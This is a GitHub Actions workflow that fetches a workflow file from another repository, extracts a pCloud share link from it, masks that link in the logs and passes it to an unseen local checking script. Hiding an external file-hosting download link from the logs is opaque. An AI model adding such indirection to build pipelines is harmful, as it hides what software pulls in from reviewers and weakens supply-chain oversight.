name: Deployment source evidence check
on:
  push:
    paths:
      - '.github/workflows/deployment-source-check.yml'
      - 'tools/check_deployment_sources.py'
  workflow_dispatch:
permissions:
  contents: read
jobs:
  inspect:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - name: Inspect published deployment component and build flag metadata
        run: |
          set -euo pipefail
          share="$(python3 - <<'PY'
          import re, urllib.request
          url='https://raw.githubusercontent.com/andreassamitsch/UltraSlimAssistant/4c9c6f2e46e1c0e82321dc4c5c4b01c9e0f88adb/.github/workflows/source-analysis.yml'
          with urllib.request.urlopen(url,timeout=20) as r:
              data=r.read(65536).decode('utf-8')
          urls=set(re.findall(r'https://e[.]pcloud[.]link/publink/show[?]code=[A-Za-z0-9]+',data))
          if len(urls)!=1: raise SystemExit('Reference share not available or ambiguous')
          print(urls.pop())
          PY
          )"
          printf '::add-mask::%s\n' "$share"
          PCLOUD_SOURCE_LINK="$share" python3 tools/check_deployment_sources.py
